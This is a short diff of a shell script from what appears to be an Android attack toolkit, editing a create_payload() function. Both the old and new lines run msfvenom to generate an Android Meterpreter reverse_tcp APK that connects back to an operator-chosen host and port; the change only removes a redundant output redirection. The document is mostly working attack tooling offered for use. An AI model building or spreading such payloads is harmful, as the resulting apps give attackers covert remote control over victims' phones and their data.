@@ -106,7 +106,7 @@ create_payload()
  if [ -L $PREFIX/bin/msfvenom ];
  then
 	 echo -e "$cyan Please Wait ..."
-	 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $HOME/androtoolkit/payload/$apkname.apk > /dev/null 2>&1
+	 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $HOME/androtoolkit/payload/$apkname.apk
 	echo
 	echo -e "$green Payload Created Successfully in androtoolkit/payload folder"
 	echo -e "$purple:)$reset"
